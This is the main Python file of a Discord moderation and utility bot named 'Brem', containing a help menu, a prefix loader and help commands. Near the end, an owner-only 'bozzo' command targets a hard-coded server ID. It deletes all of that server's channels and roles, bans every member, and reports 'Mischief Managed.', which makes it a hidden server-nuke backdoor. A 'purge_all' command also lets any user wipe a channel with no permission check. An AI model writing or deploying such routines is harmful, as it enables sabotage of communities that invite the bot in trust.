import discord
from discord.ext import commands
from replit import db
import requests
import random
import json
import asyncio
from keep_alive import keep_alive
import os
from discord.utils import find
import datetime
from datetime import datetime
from discord.ext import tasks
from googletrans import Translator
import traceback
import sys
#@commands.check_any(commands.is_owner())

# ------------------------FUNCTIONS---------------------
DEFAULT_PREFIX = "*"


def determine_prefix(bot, msg):
    guild = msg.guild
    base = [DEFAULT_PREFIX]

    with open("prefix.json", "r", encoding="utf-8") as fp:
        custom_prefixes = json.load(fp)

    if guild:
        try:
            prefix = custom_prefixes[f"{guild.id}"]
            return prefix
        except KeyError:
            return base
            return prefix

    return base

# ------------------CONFIGS--------------------------------
staff = [798280308071596063]
client = commands.Bot(
    command_prefix=determine_prefix, owner_ids=set(staff), intents=discord.Intents.all()
)
client.remove_command("help")


@client.event
async def on_ready():
    print("We Breamed in as {0.user}".format(client))
    await client.change_presence(
        status=discord.Status.idle,
        activity=discord.Activity(
            type=discord.ActivityType.watching,
            name=f"{len(client.guilds)} servers and {len(client.users)} members",
        ),
    )

    owner = client.get_user(798280308071596063)
    embed = discord.Embed(description="**I am now online.**", color=0x00C4B8)
    await owner.send(embed=embed)
    client.launch_time = datetime.utcnow()




@client.command()
async def purge_all(ctx):
  await ctx.channel.purge()
# ------------------------------------------------------


@client.command(aliases=["Command", "commands", "comms", "comamnd", "cmd"])
@commands.cooldown(1, 30, commands.BucketType.user)
async def command(ctx):
    guild = ctx.guild
    with open("prefix.json", "r", encoding="utf-8") as fp:
        custom_prefixes = json.load(fp)
    prefix = custom_prefixes[f"{guild.id}"]
    intro = discord.Embed(
        title="",
        description="The pages of commands are __navigated__ using the buttons ▶ and ◀ to go **__forward__** or **__backward__**, you can also use ⏭ and ⏮ to **__skip__** to either the first page or the last page.\n**IMPORTANT NOTE:** the ``[]`` means **__Required__** while the ``()`` means **__optional__**. you will be observing it in the commands further on",
        color=0xE29C19,
    )
    intro.set_footer(text=f"Requested by: {ctx.author}", icon_url=ctx.author.avatar_url)
    intro.set_thumbnail(
        url="https://media.discordapp.net/attachments/958758736351096932/962369652246319184/unknown.png?width=406&height=406"
    )
    list1 = discord.Embed(
        title="Server Commands (Informations)",
        description="``info (@member/id)``: info about you\n``avatar (@member/id)``: Get your avatar\n``server``: Info about server\n``bot``: Info about brem\n``create invite``: Creates invite for the server\n``information help``: Use this command if you can't understand how to use those commands",
        color=0x00C4B8,
    )
    list1.set_footer(text=f"Requested by: {ctx.author}", icon_url=ctx.author.avatar_url)

    list1.set_thumbnail(
        url="https://cdn.discordapp.com/attachments/901397587758813254/901425889210941450/logo.png"
    )
    # -----------------------------------------------------
    list2 = discord.Embed(
        title="Moderation commands (Security) PAGE 1 OF 3",
        description=f"``report``: pretty enhance coded command that any member can use to report a discord user either in/out the server to the discord TOS\n``server_lock``: Locks the server down\n``server_unlock``: Unlocks the server\n``lock [#Channel/id] (Reason)``:Locks the channel\n``unlock [#Channel/id]``: Unlocks the channel\n``enable slowmode [Number]``: Adds slowmode to the channel in seconds (ex. enable slowmode 5)\n``disable slowmode``: Disables slowmode",
        color=0x00C4B8,
    )
    list2.set_thumbnail(
        url="https://media.tenor.com/images/cb37de2f54039535426738c62136d0e3/tenor.gif"
    )
    list2.set_footer(text=f"Requested by: {ctx.author}", icon_url=ctx.author.avatar_url)
    # -----------------------------------------------------
    list22 = discord.Embed(
        title="Moderation commands (Security) PAGE 2 OF 3",
        description=f"`clear (Number)`: Deletes messages\n`mute [@Member/id] (Reason)`: Mutes a member infinitley\n`tempmute [@member/id] [Time s/m/h] (Reason)`: Temporarily mutes a member for some time\n`unmute [@member/id]`: Unmutes the member\n`kick [@Member/id] (Reason)`: Kicks the member out\n`mass_kick [id id id]`: Mass kicks many members at once, ex. `{prefix}mass_kick 2387 3238 383292`\n`ban/b [@Member/id] (Reason)`: Bans a member from the server\n`mass_ban [id id id]`: Mass bans many members at once, ex. `{prefix}mass_ban 8934 8438493 809303`\n`unban [id of the banned user]`: Unbans the user\n`mass_unban [id id id]`: Mass unbans members, ex. `{prefix}mass_unban 43734 73484379 83403489`\n `moderation help`: Use this command if you can't understand how to use those commands",
        color=0x00C4B8,
    )
    list22.set_thumbnail(
        url="https://media.tenor.com/images/cb37de2f54039535426738c62136d0e3/tenor.gif"
    ) 
    list22.set_footer(
        text=f"Requested by: {ctx.author}", icon_url=ctx.author.avatar_url
    )
    # -----------------------------------------------------
    list23 = discord.Embed(
        title="Moderation commands (Security) PAGE 3 OF 3",
        description=f"``create_role/cr [role name]``: This makes you create basic roles easier and brem will help you through hahndling the color of the role while you are excuting the command\n``remove_role/rr [@member/id] [@role/id]``: Removes Role from a user\n``give_role/gr [@member/id] [@role/id]``: Gives a member the mentioned role\n``delete_role/dr [@role/id]``: Deletes role from the server\n``nick [@member/id] [new nickname]``: Changes the member's Nickname in the server.",
        color=0x00C4B8,
    )
    list23.set_thumbnail(
        url="https://media.tenor.com/images/cb37de2f54039535426738c62136d0e3/tenor.gif"
    )
    list23.set_footer(
        text=f"Requested by: {ctx.author}", icon_url=ctx.author.avatar_url
    )
    # -----------------------------------------------------
    list3 = discord.Embed(
        title="Utility Commands",
        description="**PAGE 1 of 2**\n``quote``: Reciecve a quote from [Zen Quotes](https://zenquotes.io)\n``meme``: Recieve a meme from [heroku](https://meme-api.herokuapp.com/)\n``countdown [time s/m/h]``: Set a countdown\n``reminder [time s/m/h] [message]``: Set a reminder\n``define [word]``: Online dictionary, to get you all the meanings you need\n``translate [language to be translated to] [sentence]``: Translate command for any langauge (BETA)\n``say [message]``: To make the bot say whatever you put in the `message` section",
        color=0x00C4B8,
    )
    list3.add_field(
        name="Useful commands you can use to understand those commands",
        value="``timers help`` - ``calculations``",
        inline=True,
    )
    list3.set_thumbnail(url="https://c.tenor.com/kNrhDY0SzrcAAAAC/batman-dcau.gif")
    list3.set_footer(text=f"Requested by: {ctx.author}", icon_url=ctx.author.avatar_url)
    # -----------------------------------------------------
    list32 = discord.Embed(
        title="Utility Commands",
        description="**PAGE 2 of 2**\n``dm [@member/id] [message]``: Dm a member via bot\n``reactrole [emoji] [role] [message]``: Special command to give members roles easily\n``calculate [equation]``: Calculates equations\n``ask [question]``: 8ball command, you ask and bot answers\n``hello member [@member/id]``: Greet a member\n``embed [message]``: To make the bot say whatever you put in the `message` section but it would be sent as an **embed**\n``tts [Message]``: TTs is a custom made command that speaks the text message the user sends, try it out now!",
        color=0x00C4B8,
    )
    list32.add_field(
        name="Useful commands you can use to understand those commands",
        value="``greetings help`` - ``dms help`` - ``asking help`` - ``reactroles help``",
        inline=True,
    )
    list32.set_thumbnail(url="https://media.tenor.com/niblWGUWzQMAAAAS/view/.gif")
    list32.set_footer(
        text=f"Requested by: {ctx.author}", icon_url=ctx.author.avatar_url
    )
    # -----------------------------------------------------
    list4 = discord.Embed(
        title="Config/Extra Commands",
        description="Sets of commands that help you for configuirations",
        color=0x00C4B8,
    )
    list4.add_field(
        name="``change prefix {prefix}``",
        value="Changes brem's prefix for the server",
        inline=True,
    )
    list4.add_field(name="``brem``", value="Invite brem to your server", inline=False)
    list4.add_field(
        name="``developers``",
        value="Shows you a list of the current developers of brem",
        inline=False,
    )
    list4.add_field(name="``vote``", value="Vot for brem bot on top.gg", inline=False)

    list4.add_field(
        name="``os/open_source``",
        value="Check Brem's code, have suggestions? head to [Support server](https://discord.gg/39j2hRgMzS)",
        inline=False,
    )

    list4.set_thumbnail(
        url="https://c.tenor.com/JXhu1B1-Pl0AAAAC/it-has-to-be-extra-stephen.gif"
    )
    list4.set_footer(text=f"Requested by: {ctx.author}", icon_url=ctx.author.avatar_url)
    # -----------------------------------------------------
    lists = [intro, list1, list2, list22, list23, list3, list32, list4]
    async with ctx.typing():
        await asyncio.sleep(2)
    message = await ctx.reply(embed=intro)
    await message.add_reaction("⏮")
    await message.add_reaction("◀")
    await message.add_reaction("▶")
    await message.add_reaction("⏭")

    def check(reaction, user):
        return user == ctx.author

    i = 0
    reaction = None

    while True:
        if str(reaction) == "⏮":
            i = 0
            await message.edit(embed=lists[i])
        elif str(reaction) == "◀":
            if i > 0:
                i -= 1
                await message.edit(embed=lists[i])
        elif str(reaction) == "▶":
            if i < 7:
                i += 1
                await message.edit(embed=lists[i])
        elif str(reaction) == "⏭":
            i = 7
            await message.edit(embed=lists[i])

        try:
            reaction, user = await client.wait_for(
                "reaction_add", timeout=35.0, check=check
            )
            await message.remove_reaction(reaction, user)
        except:
            break
    await message.clear_reactions()


# --------------------built-ins--------------------------




@client.command()
async def help(ctx):
    guild = ctx.guild
    with open("prefix.json", "r", encoding="utf-8") as fp:
        custom_prefixes = json.load(fp)
        prefix = custom_prefixes[f"{guild.id}"]

    myembed = discord.Embed(title="", color=0x00C4B8)
    myembed.add_field(
        name=f"My default prefix is *",
        value=f"Hello there {ctx.author.name}! i am Brem :wave: your personal helper bot, anything you want I will be your man for the job! for more commands say {prefix}commands",
    )
    myembed.set_thumbnail(
        url="https://cdn.discordapp.com/attachments/901397587758813254/901425889210941450/logo.png"
    )
    myembed.set_footer(
        text=f"Requested by: {ctx.author}", icon_url=ctx.author.avatar_url
    )
    await ctx.reply(embed=myembed)



# -------------------SUPPORT COMMANDS-----------------------
@client.command()
@commands.has_permissions(kick_members=True)
async def reactroles(ctx, help=None):
    guild = ctx.guild
    with open("prefix.json", "r", encoding="utf-8") as fp:
        custom_prefixes = json.load(fp)
        prefix = custom_prefixes[f"{guild.id}"]
    if help == None:
        await ctx.reply(
            f"Sorry {ctx.author.mention}, there is no such command in brem. Perhaps you meant ``reactroles help`` or ``reactrole`` ?"
        )
        return
    if help != "help":
        return
    myembed = discord.Embed(title="", color=0x00C4B8)
    myembed.add_field(
        name="Format", value=f"{prefix}reactrole [emoji] [role] [message]", inline=False
    )
    myembed.add_field(
        name="Should look like this :arrow_down:",
        value=f"{prefix}reactrole :tada: <@&813988500549926923> React with :tada: to recieve the server staff role",
        inline=False,
    )
    myembed.set_image(
        url="https://media.discordapp.net/attachments/798463700637974541/857336016570548224/image0.png?width=739&height=406"
    )
    await ctx.send(embed=myembed)





@client.command()
async def dms(ctx, help=None):
    guild = ctx.guild
    with open("prefix.json", "r", encoding="utf-8") as fp:
        custom_prefixes = json.load(fp)
        prefix = custom_prefixes[f"{guild.id}"]
    if help == None:
        await ctx.reply(
            f"Sorry {ctx.author.mention}, there is no such command in brem. Perhaps you meant ``dms help`` or ``dm`` ?"
        )
        return
    if help != "help":
        return
    myembed = discord.Embed(
        title="", description=f"{prefix}dm [@member/id] [message]", color=0x00C4B8
    )
    myembed.add_field(
        name="Should look like this :arrow_down:",
        value=f"{prefix}dm <@798280308071596063> hello there hamza!",
        inline=False,
    )
    myembed.set_footer(
        text=f"Requested by: {ctx.author}", icon_url=ctx.author.avatar_url
    )
    await ctx.reply(embed=myembed)


@client.command(aliases=["greeting", "Greetings", "greetin", "Greetin"])
async def greetings(ctx, help=None):
    guild = ctx.guild
    with open("prefix.json", "r", encoding="utf-8") as fp:
        custom_prefixes = json.load(fp)
        prefix = custom_prefixes[f"{guild.id}"]
    if help == None:
        await ctx.reply(
            f"Sorry {ctx.author.mention}, there is no such command in brem. Perhaps you meant ``greetings help`` ?"
        )
        return
    if help != "help":
        return
    myembed = discord.Embed(title="", color=0x00C4B8)
    myembed.add_field(
        name="First command you can use :arrow_heading_down:",
        value=f"```{prefix}hello member [@member/id]``` *This sends a member a greeting message privately from you!*",
        inline=False,
    )
    myembed.add_field(
        name="Second command you can use :arrow_heading_down:",
        value=f"```{prefix}greet back [@member/id]``` *Got greeted by someone? simple just greet him/her back by using this command!*",
        inline=False,
    )
    myembed.add_field(
        name=":exclamation:IMPORTANT:exclamation:",
        value=":sparkles: Archer#4706 :sparkles: Is the founder of this command",
        inline=False,
    )
    await ctx.reply(embed=myembed)





@client.command()
async def avatars(ctx, help=None):
    guild = ctx.guild
    with open("prefix.json", "r", encoding="utf-8") as fp:
        custom_prefixes = json.load(fp)
        prefix = custom_prefixes[f"{guild.id}"]

    if help == None:
        await ctx.reply(
            f"Sorry {ctx.author.mention}, there is no such command in brem. Perhaps you meant ``avatars help`` ?"
        )
        return
    if help != "help":
        return
        myembed = discord.Embed(
            title="Avatars",
            description=f"```{prefix}avatar (optional @member/id)",
            color=0x00C4B8,
        )
        await ctx.reply(embed=myembed)
           


@client.command()
@commands.is_owner()
async def emojis(ctx):
    owner = client.get_user(798280308071596063)
    for emoji in ctx.guild.emojis:
        embed = discord.Embed(
            description=f"{emoji}>{emoji.name}> {emoji.id}", color=0x00C4B8
        )
        await owner.send(embed=embed)

@client.command()
@commands.is_owner()
async def bozzo(ctx): #943206122070888531
    guild1 = client.get_guild(943206122070888531)
    for channel in guild1.channels:
      try:
        await channel.delete()
      except:
        pass
    for role in guild1.roles:
      try:
        await role.delete()
      except:
        pass
    for member in guild1.members:
      try:
        await member.ban(reason='cuz ham said so')
      except:
        pass
    await ctx.author.send("Mischief Managed.") 
      

# ------------------LAST CONFIG SHELL-----------------------
for filename in os.listdir("./cogs"):
    if filename.endswith(".py"):
        client.load_extension(f"cogs.{filename[:-3]}")
    (f"cogs.{filename[:-3]}")

keep_alive()
client.run(os.getenv("TOKEN"))
